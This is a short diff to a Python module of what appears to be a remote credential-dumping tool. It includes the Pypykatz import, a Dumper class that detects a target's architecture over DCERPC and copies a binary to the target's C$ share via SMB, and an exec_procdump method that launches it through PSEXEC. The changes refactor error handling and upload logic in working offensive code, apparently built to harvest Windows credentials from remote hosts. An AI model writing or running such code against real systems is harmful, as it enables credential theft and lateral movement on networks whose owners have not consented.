@@ -15,6 +15,7 @@ from os import path
 import re
 import json
 import os
+import sys
 
 
 #########################Pypykatz##############################
@@ -72,21 +73,26 @@ class Dumper:
             except DCERPCException as e:
                 if str(e).find("syntaxes_not_supported") >= 0:
                     return 32
-                else:
-                    pass
             else:
                 return 64
-            dce.disconnect()
         except Exception:
-            return "Unknown"
+            pass
+        finally:
+            dce.disconnect()
+        return "Unknown"
 
     def upload_file(self):
         if self.host_info["arch"] == 64:
             src = src_x64
+            filename = re.sub(r"\d+", "", path.basename(src))
+            self.smb.putFile("C$", filename, open(src, "rb").read)
         elif self.host_info["arch"] == 32:
             src = src_x32
-        filename = re.sub(r"\d+", "", path.basename(src))
-        self.smb.putFile("C$", filename, open(src, "rb").read)
+            filename = re.sub(r"\d+", "", path.basename(src))
+            self.smb.putFile("C$", filename, open(src, "rb").read)
+        else:
+            print("Something went wrong")
+            sys.exit(1)
 
     def exec_procdump(self):
         executer = PSEXEC(
